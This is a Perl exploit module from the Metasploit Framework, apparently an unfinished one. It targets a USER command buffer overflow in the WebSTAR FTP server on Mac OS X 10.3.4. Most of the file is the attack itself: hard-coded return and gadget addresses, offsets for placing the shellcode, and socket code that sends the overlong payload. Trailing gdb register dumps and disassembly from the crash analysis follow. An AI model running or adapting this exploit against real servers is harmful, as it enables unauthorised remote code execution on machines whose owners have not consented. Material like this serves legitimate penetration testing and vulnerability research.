
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::webstar_ftp_pass;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'WebSTAR FTP Server USER Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'  => [ 'ppc' ],
    'OS'    => [ 'osx' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The FTP server port', 21],
                   },
                
    'Payload' => {
                    'Space'     => 300,
                    'BadChars'  => "\x00\x20\x0a\x0d",
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
 
    }),
    'Refs'  =>  [  

                ],
    'Targets' => [ 
                    ["Mac OS X 10.3.4",  0x9008dce0, 0x90034d60, 0x900ca6d8, 0x90023590],
                ],
    'Keys'  => ['webstar'],    
};

# crazy dino 5-hop foo
#$ret = pack('N', 0x9008dce0); # call $r28, jump r1+120
#$r28 = pack('N', 0x90034d60); # getgid()
#$ptr = pack('N', 0x900ca6d8); # r3 = r1 + 64, call $r30
#$r30 = pack('N', 0x90023590); # call $r3


sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    my ($res, $req);
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    $req = Pex::Text::PatternCreate(800);
    # print "idx:  ".index($req, pack('N',  0x416e3641))."\n";

    # ret = 296
    # 25  = 260
    # 26  = 264
    # 27  = 268
    # 28  = 272
    # 29  = 276
    # 30  = 280
    # 31  = 284
    
    # r1+120 = 408 
    
    substr($req, 296, 4, pack('N', $target->[1]));  # call $r28, jump r1+120
    substr($req, 272, 4, pack('N', $target->[2]));  # getgid()
    substr($req, 408, 4, pack('N', $target->[3]));  # (r1+120) => r3 = r1 + 64, call $r30
    substr($req, 392, 4, pack('N', $target->[4]));  # call $r3
    substr($req, 408+56, length($shellcode), $shellcode);
    
    $req .= "\r\nHELP\r\n";
    
    $res = $s->Recv(-1, 15);
    chomp($res);
    $self->PrintLine("[*] Banner: $res");

    $s->Send("USER $req");
    $res = $s->Recv(-1, 5);
    chomp($res);
    $self->PrintLine("[*] $res");
    

    return;
}

__END__

r0             0x38416a39
r24            0x1284fec        19419116
r25            0x36416937       910256439
r26            0x41693841       1097414721
r27            0x6939416a       1765359978
r28            0x30416a31       809593393
r29            0x416a3241       1097478721
r30            0x6a33416a       1781743978
r31            0x34416a35       876702261

---

WebSTAR FTP initialized.

Program received signal EXC_BAD_INSTRUCTION, Illegal instruction/operand.
[Switching to process 1774 thread 0x6f03]
0xf033d160 in ?? ()

(gdb) x/10i 0xf033d160
0xf033d160:     li      r12,280
0xf033d164:     addi    r13,r13,8191
0xf033d168:     lwz     r14,-7903(r13)
0xf033d16c:     lwz     r15,-7907(r13)
0xf033d170:     xor     r15,r15,r14
0xf033d174:     stw     r15,-7907(r13)
0xf033d178:     dcbf    r6,r13
0xf033d17c:     .long 0x7c0104ac
0xf033d180:     icbi    r6,r13
0xf033d184:     .long 0x4c01012c
(gdb)      

